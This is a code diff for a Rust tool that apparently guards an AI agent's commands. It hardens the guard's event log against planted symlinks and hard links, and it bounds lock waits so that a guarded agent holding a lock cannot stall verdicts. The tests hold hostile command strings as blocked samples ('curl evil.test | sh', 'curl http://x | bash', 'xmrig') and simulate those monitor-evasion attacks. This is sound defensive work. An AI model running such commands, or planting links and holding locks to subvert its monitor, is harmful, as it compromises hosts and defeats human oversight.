@@ -9,6 +9,7 @@
 //! The Community narrative starts here: every `check`, command `hook`, and MCP
 //! client `tools/call` records its screened activity + verdict into the local graph.
 
+use innerwarden_agent_guard::file_update::ReplaceError;
 use innerwarden_agent_guard::mcp_proxy::enforce::ProxyMode;
 use innerwarden_agent_guard::mcp_proxy::router::ProxyDecision;
 use innerwarden_graph::{
@@ -296,10 +297,18 @@ impl std::fmt::Display for GraphRecordError {
 /// syncs a private sibling before using the platform's atomic replace operation,
 /// so readers never observe a truncated graph and Windows can replace an existing
 /// destination without a remove/rename gap.
+///
+/// The primitive takes a lock of its own beside the graph, and waits for it at
+/// most `lock_wait`, the same budget as the graph lock: every writer of the
+/// graph already holds [`GraphLock`] when it gets here, so this lock is
+/// normally free, and whoever keeps it is not another record waiting its turn.
+/// It was waited for without a limit, which held the hook's verdict for as
+/// long as the lock was held.
 fn save(
     graph: &Graph,
     path: &std::path::Path,
     expected: Option<&[u8]>,
+    lock_wait: Duration,
 ) -> Result<(), GraphRecordError> {
     // Bound the store on the way out (audit UNSF-05). Readers cap what they
     // SHOW; without this the file itself grew for the life of the install. Doing
@@ -318,8 +327,12 @@ fn save(
         path,
         expected,
         graph.to_json().as_bytes(),
+        lock_wait,
     )
-    .map_err(|_| GraphRecordError::WriteFailed)
+    .map_err(|error| match error {
+        ReplaceError::LockBusy { .. } => GraphRecordError::LockTimedOut,
+        ReplaceError::Failed(_) => GraphRecordError::WriteFailed,
+    })
 }
 
 /// Record a standalone `innerwarden check`. It screens a command but does not
@@ -579,6 +592,10 @@ fn mcp_graph_verdict(decision: &ProxyDecision) -> Value {
 
 /// Record one command + its verdict/context into the persisted narrative graph.
 /// Best-effort: any I/O/clock failure is swallowed so it never changes a verdict.
+/// And bounded: each of the two locks a write takes is waited for at most
+/// [`GRAPH_LOCK_TIMEOUT`], so a lock held by another process (any account that
+/// can open it, the guarded agent's included) delays the hook's verdict by that
+/// much and is reported as an outage, instead of withholding the verdict.
 fn record(
     command: &str,
     verdict: &Value,
@@ -611,7 +628,14 @@ fn record(
         outcome,
         DecisionOutcome::Blocked | DecisionOutcome::WouldBlock
     ) {
-        emit_guard_event(&path, &command, &verdict, mode, outcome, &session);
+        emit_guard_event(
+            &path,
+            &command,
+            &verdict,
+            DecisionContextParts { mode, outcome },
+            &session,
+            origin.agent.as_deref(),
+        );
     }
     if let Err(error) = record_at_with_origin(
         &path,
@@ -731,18 +755,44 @@ pub(crate) fn append_guard_event(line: &Value) {
 /// the guarantee `O_APPEND` actually offers; it is not a promise about every
 /// filesystem, and this stays best-effort telemetry that can never alter a
 /// verdict.
-fn append_guard_event_at(dir: &std::path::Path, line: &Value) {
+pub(crate) fn append_guard_event_at(dir: &std::path::Path, line: &Value) {
     use std::io::Write;
     let path = dir.join("guard-events.jsonl");
     create_sink_with_directory_ownership(&path);
     let mut record = line.to_string();
     record.push('\n');
-    if let Ok(mut file) = std::fs::OpenOptions::new()
-        .create(true)
-        .append(true)
-        .open(&path)
-    {
-        let _ = file.write_all(record.as_bytes());
+    // Never through a link, never waiting on a FIFO, only into a plain file
+    // that has no other name. The directory is shared with the guarded agent's
+    // uid, and this CLI is also run as root (`sudo`): appending through a name
+    // that uid had pointed at a root-owned file would have been root writing a
+    // line of its choosing there. `harden` refuses a symbolic link at open; a
+    // HARD link opens fine and is only visible in the link count.
+    //
+    // A refused or failed append is said on stderr, and the condition behind
+    // it is what `record_health::report_at` reports as an outage, so the
+    // dashboard and `innerwarden graph` show the sink as not recording rather
+    // than as a quiet, healthy host.
+    let mut options = std::fs::OpenOptions::new();
+    options.create(true).append(true);
+    innerwarden_safe_io::harden(&mut options);
+    let refused = match options.open(&path) {
+        Ok(mut file) => match file.metadata() {
+            Ok(metadata) => match crate::record_health::refusal(&metadata) {
+                Some(why) => Some(crate::record_health::refusal_words(why).to_string()),
+                None => file
+                    .write_all(record.as_bytes())
+                    .err()
+                    .map(|e| format!("could not be written ({})", e.kind())),
+            },
+            Err(error) => Some(format!("could not be read ({})", error.kind())),
+        },
+        Err(error) => Some(format!("could not be opened ({})", error.kind())),
+    };
+    if let Some(why) = refused {
+        eprintln!(
+            "innerwarden: a guard event was not recorded: guard-events.jsonl {why}. \
+             `innerwarden graph --stats` says what to do."
+        );
     }
 }
 
@@ -785,9 +835,9 @@ fn emit_guard_event(
     graph_path: &std::path::Path,
     command: &str,
     verdict: &Value,
-    mode: DecisionMode,
-    outcome: DecisionOutcome,
+    context: DecisionContextParts,
     session: &str,
+    agent: Option<&str>,
 ) {
     let Some(dir) = graph_path.parent() else {
         return;
@@ -796,17 +846,38 @@ fn emit_guard_event(
         .duration_since(std::time::UNIX_EPOCH)
         .map(|d| d.as_secs())
         .unwrap_or(0);
-    let line = serde_json::json!({
+    append_guard_event_at(
+        dir,
+        &guard_blocked_line(ts, command, verdict, context, session, agent),
+    );
+}
+
+/// The `guard.blocked` line for one decision. It names the agent the hook or
+/// proxy was connected for when the wiring names one, so a reader can tell
+/// whose action it was: `observe` credits the guard with an ask's outcome
+/// only for a refusal of the agent that was asked.
+fn guard_blocked_line(
+    ts: u64,
+    command: &str,
+    verdict: &Value,
+    context: DecisionContextParts,
+    session: &str,
+    agent: Option<&str>,
+) -> Value {
+    let mut line = serde_json::json!({
         "kind": "guard.blocked",
         "ts": ts,
-        "outcome": outcome.as_str(),
-        "mode": mode.as_str(),
+        "outcome": context.outcome.as_str(),
+        "mode": context.mode.as_str(),
         "recommendation": verdict.get("recommendation").and_then(|v| v.as_str()).unwrap_or(""),
         "risk_score": verdict.get("risk_score").and_then(|v| v.as_u64()).unwrap_or(0),
         "detail": command,
         "session": session,
     });
-    append_guard_event_at(dir, &line);
+    if let Some(agent) = agent.filter(|agent| innerwarden_agent_guard::hook::is_agent_id(agent)) {
+        line["agent"] = json!(agent);
+    }
+    line
 }
 
 /// A decision's mode and outcome, before the time is stamped on them.
@@ -911,7 +982,7 @@ where
     ) {
         return Ok(());
     }
-    save(&g, path, expected.as_deref())
+    save(&g, path, expected.as_deref(), lock_timeout)
 }
 
 /// Domain-separated one-way identity for one provider hook delivery. Length
@@ -1027,13 +1098,18 @@ impl GraphLock {
     {
         use fs4::FileExt;
         let lock_path = path.with_extension("json.lock");
-        let f = std::fs::OpenOptions::new()
-            .read(true)
-            .create(true)
-            .truncate(false)
-            .write(true)
-            .open(&lock_path)
-            .map_err(|_| GraphRecordError::LockUnavailable)?;
+        // Opened the way every writer of the shared record has to open it
+        // (`file_update::open_shared_lock`): read-only when it exists, created
+        // in the directory's group where the directory is shared, and replaced
+        // there when an older release left one this account cannot open. This
+        // asked for write access on a lock root had created `0644`, so after a
+        // single `sudo` run the operator could not take it, and every decision
+        // from then on was `graph_lock_unavailable`.
+        let open = || {
+            innerwarden_agent_guard::file_update::open_shared_lock(&lock_path)
+                .map_err(|_| GraphRecordError::LockUnavailable)
+        };
+        let mut f = open()?;
         let started = Instant::now();
         let mut on_contention = Some(on_contention);
         loop {
@@ -1045,6 +1121,16 @@ impl GraphLock {
             // `fs4::lock_contended_error()`. A genuine I/O failure is still a
             // distinct arm and is still NOT retried.
             match FileExt::try_lock(&f) {
+                // A lock replaced while this writer waited serialises nothing:
+                // take the one that is there now.
+                Ok(())
+                    if !innerwarden_agent_guard::file_update::lock_still_names(&f, &lock_path) =>
+                {
+                    if started.elapsed() >= timeout {
+                        return Err(GraphRecordError::LockTimedOut);
+                    }
+                    f = open()?;
+                }
                 Ok(()) => return Ok(GraphLock(f)),
                 Err(fs4::TryLockError::WouldBlock) => {
                     if let Some(observer) = on_contention.take() {
@@ -1928,6 +2014,58 @@ mod tests {
         );
     }
 
+    /// The sink the paid agent tails is in a directory the guarded agent's
+    /// uid writes, and this CLI also runs as root. A link planted at its name
+    /// is never appended through.
+    ///
+    /// FAILS ON REVERT: open it without `harden` and the victim gains a line.
+    #[cfg(unix)]
+    #[test]
+    fn a_link_at_the_guard_event_sink_is_never_appended_through() {
+        let dir = tempfile::TempDir::new().unwrap();
+        let elsewhere = tempfile::TempDir::new().unwrap();
+        let victim = elsewhere.path().join("cron-job");
+        std::fs::write(&victim, "# untouched\n").unwrap();
+        std::os::unix::fs::symlink(&victim, dir.path().join("guard-events.jsonl")).unwrap();
+
+        append_guard_event_at(dir.path(), &json!({"kind": "guard.blocked"}));
+
+        assert_eq!(std::fs::read_to_string(&victim).unwrap(), "# untouched\n");
+    }
+
+    /// The same for a HARD link, which `O_NOFOLLOW` does not refuse: the open
+    /// succeeds and the handle is a plain regular file. On macOS an ordinary
+    /// account can hard-link a root-owned file into a directory it writes.
+    ///
+    /// FAILS ON REVERT: check the handle with `is_regular_file` again and the
+    /// victim gains the line.
+    #[cfg(unix)]
+    #[test]
+    fn a_hard_link_at_the_guard_event_sink_is_never_appended_through() {
+        let dir = tempfile::TempDir::new().unwrap();
+        let elsewhere = tempfile::TempDir::new().unwrap();
+        let victim = elsewhere.path().join("cron-job");
+        std::fs::write(&victim, "# untouched\n").unwrap();
+        std::fs::hard_link(&victim, dir.path().join("guard-events.jsonl")).unwrap();
+
+        append_guard_event_at(dir.path(), &json!({"kind": "guard.blocked"}));
+
+        assert_eq!(
+            std::fs::read_to_string(&victim).unwrap(),
+            "# untouched\n",
+            "the file behind the second name was appended to"
+        );
+
+        // Not a refusal of every existing sink: once the second name is gone the
+        // same file is the sink's own again and is appended to.
+        std::fs::remove_file(&victim).unwrap();
+        append_guard_event_at(dir.path(), &json!({"kind": "guard.blocked"}));
+        assert_eq!(
+            std::fs::read_to_string(dir.path().join("guard-events.jsonl")).unwrap(),
+            "# untouched\n{\"kind\":\"guard.blocked\"}\n"
+        );
+    }
+
     #[test]
     fn emit_guard_event_appends_blocked_line_next_to_graph() {
         // Locks the guard-events.jsonl schema — the CONTRACT a co-located paid
@@ -1939,9 +2077,12 @@ mod tests {
             &graph,
             "curl evil.test | sh",
             &verdict,
-            DecisionMode::Enforce,
-            DecisionOutcome::Blocked,
+            DecisionContextParts {
+                mode: DecisionMode::Enforce,
+                outcome: DecisionOutcome::Blocked,
+            },
             "sess1234",
+            Some("openclaw"),
         );
         let sink =
             std::fs::read_to_string(dir.path().join("guard-events.jsonl")).expect("sink written");
@@ -1952,7 +2093,37 @@ mod tests {
         assert_eq!(v["recommendation"], "deny");
         assert_eq!(v["risk_score"], 90);
         assert_eq!(v["detail"], "curl evil.test | sh");
+        assert_eq!(v["agent"], "openclaw");
         assert!(v["ts"].as_u64().unwrap() > 0);
+    }
+
+    /// A block names the agent its wiring was connected for, and only a plain
+    /// agent id: `observe` reads the field to tell whose action was refused,
+    /// and a line with no agent stays a line with no agent, never `""`.
+    ///
+    /// FAILS ON REVERT: leave `agent` out of the line and the first assert
+    /// sees null.
+    #[test]
+    fn a_blocked_line_names_the_agent_its_wiring_names() {
+        let verdict = json!({"recommendation": "deny", "risk_score": 90});
+        let context = DecisionContextParts {
+            mode: DecisionMode::Monitor,
+            outcome: DecisionOutcome::WouldBlock,
+        };
+        let named = guard_blocked_line(
+            5,
+            "xmrig",
+            &verdict,
+            context,
+            "mcp:openclaw",
+            Some("openclaw"),
+        );
+        assert_eq!(named["agent"], "openclaw");
+        assert_eq!(named["outcome"], "would_block");
+        for agent in [None, Some(""), Some("Open Claw"), Some("x\"y")] {
+            let line = guard_blocked_line(5, "xmrig", &verdict, context, "s", agent);
+            assert!(line.get("agent").is_none(), "{agent:?}: {line}");
+        }
     }
 
     fn decision(allowed: bool, alerts: Vec<VerdictAlert>) -> ProxyDecision {
@@ -2304,6 +2475,57 @@ mod tests {
             .any(|node| node.id == "cmd:agent-codex:0"));
     }
 
+    /// THE DEMO-HOST DEFECT, the lock half. One `sudo` run of this CLI (which
+    /// `innerwarden-ctl drill` used to do) created `graph.json.lock` as root,
+    /// `0644`: readable by the operator, not writable. The lock was opened
+    /// read-write, so every later decision was `graph_lock_unavailable`.
+    ///
+    /// FAILS ON REVERT: open the lock read-write again and this record fails
+    /// with `LockUnavailable`.
+    #[cfg(unix)]
+    #[test]
+    fn a_graph_lock_another_account_created_does_not_stop_recording() {
+        use std::os::unix::fs::PermissionsExt;
+        // SAFETY: reads the process credentials, cannot fail.
+        if unsafe { libc::geteuid() } == 0 {
+            panic!(
+                "running as root, which ignores file modes, so a lock this account may \
+                 only read cannot be constructed. Run the suite as an ordinary account."
+            );
+        }
+        let dir = tempfile::TempDir::new().unwrap();
+        let shared = dir.path().join("guard");
+        std::fs::create_dir(&shared).unwrap();
+        std::fs::set_permissions(&shared, std::fs::Permissions::from_mode(0o2770)).unwrap();
+        let path = shared.join("graph.json");
+        let lock = path.with_extension("json.lock");
+        std::fs::write(&lock, b"").unwrap();
+        std::fs::set_permissions(&lock, std::fs::Permissions::from_mode(0o444)).unwrap();
+        assert!(
+            std::fs::OpenOptions::new().write(true).open(&lock).is_err(),
+            "precondition: the lock is one this account may read and not write"
+        );
+
+        record_at_with_options(
+            &path,
+            "agent-after-sudo",
+            "git status",
+            &json!({"recommendation": "allow"}),
+            DecisionMode::Monitor,
+            DecisionOutcome::Allowed,
+            None,
+            GRAPH_LOCK_TIMEOUT,
+            || {},
+        )
+        .expect("a lock somebody else created must not stop the recording");
+
+        let graph = Graph::from_json(&std::fs::read_to_string(&path).unwrap()).unwrap();
+        assert!(graph
+            .nodes
+            .iter()
+            .any(|node| node.id == "cmd:agent-after-sudo:0"));
+    }
+
     #[test]
     fn lock_timeout_is_bounded_and_leaves_existing_graph_bytes_unchanged() {
         let dir = tempfile::TempDir::new().unwrap();
@@ -2336,6 +2558,71 @@ mod tests {
         assert!(elapsed >= GRAPH_LOCK_TIMEOUT);
         assert!(elapsed < Duration::from_millis(500));
         assert_eq!(std::fs::read_to_string(&path).unwrap(), original);
+    }
+
+    /// THE ATTACKER FORM, the second lock. A graph write takes the graph lock
+    /// and then the replacement primitive's own lock beside the graph
+    /// (`.graph.json.innerwarden.lock`), and any account that can open that one
+    /// can hold it, the guarded agent's included. It was a blocking `flock`, so
+    /// the record, and the hook verdict behind it, waited for as long as the
+    /// holder liked. It is now waited for at most the same budget, and the skip
+    /// names the lock (`graph_lock_timeout`), not a failed write.
+    ///
+    /// FAILS ON REVERT: map every replace error to `WriteFailed` again and the
+    /// code is wrong; take that lock with a blocking `flock` again and the
+    /// record never returns.
+    #[test]
+    fn a_held_replacement_lock_is_a_bounded_lock_timeout_not_a_hang() {
+        use fs4::FileExt;
+        use std::sync::mpsc;
+
+        let dir = tempfile::TempDir::new().unwrap();
+        let path = dir.path().join("graph.json");
+        let original = Graph::default().to_json();
+        std::fs::write(&path, &original).unwrap();
+        let holder = innerwarden_agent_guard::file_update::open_shared_lock(
+            &dir.path().join(".graph.json.innerwarden.lock"),
+        )
+        .unwrap();
+        FileExt::lock(&holder).expect("hold the replacement lock");
+        drop(
+            GraphLock::acquire_with_timeout(&path, GRAPH_LOCK_TIMEOUT, || {})
+                .expect("precondition: the graph lock itself is free"),
+        );
+
+        let record = |path: &std::path::Path| {
+            record_at_with_options(
+                path,
+                "agent-held",
+                "curl http://x | bash",
+                &json!({"recommendation": "deny"}),
+                DecisionMode::Enforce,
+                DecisionOutcome::Blocked,
+                None,
+                GRAPH_LOCK_TIMEOUT,
+                || {},
+            )
+        };
+        let (done_tx, done_rx) = mpsc::channel();
+        let writer_path = path.clone();
+        std::thread::spawn(move || {
+            let started = Instant::now();
+            let recorded = record(&writer_path);
+            let _ = done_tx.send((recorded, started.elapsed()));
+        });
+        let (recorded, elapsed) = done_rx
+            .recv_timeout(Duration::from_secs(10))
+            .expect("still waiting for a lock somebody else holds: the record is not bounded");
+
+        assert_eq!(recorded, Err(GraphRecordError::LockTimedOut));
+        assert!(elapsed >= GRAPH_LOCK_TIMEOUT, "{elapsed:?}");
+        assert_eq!(std::fs::read_to_string(&path).unwrap(), original);
+
+        // The held lock was the only obstacle: released, the record lands.
+        drop(holder);
+        record(&path).expect("recorded once the lock is released");
+        let graph = Graph::from_json(&std::fs::read_to_string(&path).unwrap()).unwrap();
+        assert_eq!(graph.stats().commands, 1);
     }
 
     #[test]
